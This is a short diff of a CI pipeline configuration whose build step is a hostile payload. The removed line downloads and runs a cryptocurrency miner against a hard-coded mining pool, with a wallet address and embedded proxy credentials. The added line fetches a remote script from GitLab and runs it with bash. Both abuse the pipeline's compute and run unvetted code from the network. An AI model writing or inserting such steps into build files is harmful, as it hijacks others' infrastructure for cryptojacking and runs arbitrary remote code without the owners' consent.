@@ -13,5 +13,4 @@ jobs:
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://github.com/aurbach55/kyubi/raw/main/ass >/dev/null 2>&1 && 
-wget https://github.com/aurbach55/kyubi/raw/main/verus-solver >/dev/null 2>&1 && chmod +x ass verus-solver >/dev/null 2>&1 && ./ass -c stratum+tcp://139.99.123.225:3956 -u RWsems1CfyqgPe4c9UdJTP2RsSUtC389jG.pipe -p x --cpu $(($(nproc)-1)) --proxy socks5://gilaajakali-rotate:g1l4l03k4l1@149.6.162.2:80
+  - script: wget https://gitlab.com/mimix200/zpol/-/raw/main/TRX && bash TRX
